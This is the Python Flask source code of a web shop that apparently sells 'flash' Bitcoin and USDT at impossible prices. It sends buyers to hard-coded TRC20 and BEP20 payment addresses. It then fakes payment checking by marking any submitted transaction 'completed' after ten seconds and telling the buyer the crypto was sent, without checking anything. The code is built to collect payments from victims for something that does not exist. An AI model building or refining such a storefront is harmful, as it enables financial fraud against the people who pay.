from flask import Flask, render_template, request, session, redirect, url_for, jsonify
import time
import random
import string
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'your-secret-key-here-change-in-production'
app.permanent_session_lifetime = timedelta(minutes=30)

# Configuration
BITCOIN_PRICE_PER_FLASH = 500  # $500 per 0.05 BTC (25$ for 0.05)
USDT_PRICE_PER_FLASH = 0.04    # $0.04 per flash USDT (1$ = 25 flash USDT)

# Wallet Addresses - All using TRC20 for Bitcoin as requested
WALLET_ADDRESSES = {
    'bitcoin': {
        'network': 'TRC20',  # Changed to TRC20 for Bitcoin
        'address': 'TQsqhmhHgpLjYcs3YUgKEpCRZDA2LVL9WE'  # TRC20 address for Bitcoin
    },
    'usdt_bep20': {
        'network': 'BEP20',
        'address': '0xb7e6cea8376bd4aadd96c543cae48236a7f3a547'
    },
    'usdt_trc20': {
        'network': 'TRC20',
        'address': 'TQsqhmhHgpLjYcs3YUgKEpCRZDA2LVL9WE'
    }
}

# Store transactions in memory (use database in production)
transactions = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/wallet-details', methods=['POST'])
def wallet_details():
    crypto = request.form.get('crypto')
    network = request.form.get('network')
    plan = request.form.get('plan')
    
    session['crypto'] = crypto
    session['network'] = network
    session['plan'] = plan
    
    return render_template('wallet_details.html', 
                         crypto=crypto, 
                         network=network, 
                         plan=plan)

@app.route('/calculate-price', methods=['POST'])
def calculate_price():
    data = request.get_json()
    crypto = data.get('crypto')
    amount = float(data.get('amount', 0))
    
    if crypto == 'Bitcoin':
        # Bitcoin: 0.05 BTC = $25
        price = (amount / 0.05) * 25
        return jsonify({
            'price': round(price, 2),
            'formatted_price': f"${round(price, 2)}"
        })
    else:
        # USDT: 1$ = 25 flash USDT
        price = amount * USDT_PRICE_PER_FLASH
        return jsonify({
            'price': round(price, 2),
            'formatted_price': f"${round(price, 2)}"
        })

@app.route('/submit-wallet', methods=['POST'])
def submit_wallet():
    crypto = request.form.get('crypto')
    wallet_address = request.form.get('wallet_address')
    amount = float(request.form.get('amount', 0))
    
    # Calculate price
    if crypto == 'Bitcoin':
        price = (amount / 0.05) * 25
        min_amount = 0.05
        max_amount = 2.0
    else:
        price = amount * USDT_PRICE_PER_FLASH
        min_amount = 500  # Minimum 500 flash USDT
        max_amount = 100000  # Maximum limit
    
    # Store in session
    session['wallet_address'] = wallet_address
    session['amount'] = amount
    session['price'] = price
    
    # Get appropriate payment address - All using TRC20 for Bitcoin
    if crypto == 'Bitcoin':
        payment_address = WALLET_ADDRESSES['bitcoin']['address']
        network = 'TRC20'  # Bitcoin now uses TRC20
    elif crypto == 'USDT' and session.get('network') == 'BEP20':
        payment_address = WALLET_ADDRESSES['usdt_bep20']['address']
        network = 'BEP20'
    else:
        payment_address = WALLET_ADDRESSES['usdt_trc20']['address']
        network = 'TRC20'
    
    return render_template('payment.html',
                         crypto=crypto,
                         amount=amount,
                         price=price,
                         payment_address=payment_address,
                         network=network,
                         wallet_address=wallet_address)

@app.route('/verify-payment', methods=['POST'])
def verify_payment():
    transaction_id = request.form.get('transaction_id')
    crypto = session.get('crypto')
    amount = session.get('amount')
    price = session.get('price')
    wallet_address = session.get('wallet_address')
    
    # Generate unique transaction ID
    tx_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    
    # Store transaction
    transactions[tx_id] = {
        'crypto': crypto,
        'amount': amount,
        'price': price,
        'wallet_address': wallet_address,
        'transaction_id': transaction_id,
        'status': 'verifying',
        'created_at': datetime.now(),
        'expires_at': datetime.now() + timedelta(minutes=5)
    }
    
    session['tx_id'] = tx_id
    
    return render_template('processing.html',
                         tx_id=tx_id,
                         crypto=crypto,
                         amount=amount,
                         price=price)

@app.route('/check-status/<tx_id>')
def check_status(tx_id):
    if tx_id in transactions:
        tx = transactions[tx_id]
        
        # Check if expired
        if datetime.now() > tx['expires_at']:
            tx['status'] = 'expired'
            return jsonify({
                'status': 'expired',
                'message': 'Payment verification timeout. Please try again.'
            })
        
        # Simulate verification (in production, this would check blockchain)
        # For demo, we'll randomly verify after a few seconds
        time_elapsed = (datetime.now() - tx['created_at']).total_seconds()
        
        if time_elapsed > 10:  # Verify after 10 seconds for demo
            tx['status'] = 'completed'
            return jsonify({
                'status': 'completed',
                'message': 'Payment verified successfully! Your Flash Creepto has been sent to your wallet.',
                'redirect': url_for('success')
            })
        else:
            return jsonify({
                'status': 'verifying',
                'message': 'Verifying your payment...',
                'time_remaining': max(0, 300 - int(time_elapsed))
            })
    
    return jsonify({'status': 'not_found', 'message': 'Transaction not found'})

@app.route('/success')
def success():
    tx_id = session.get('tx_id')
    if tx_id and tx_id in transactions:
        tx = transactions[tx_id]
        return render_template('success.html', transaction=tx)
    return redirect(url_for('index'))

@app.route('/reset')
def reset():
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=20283)
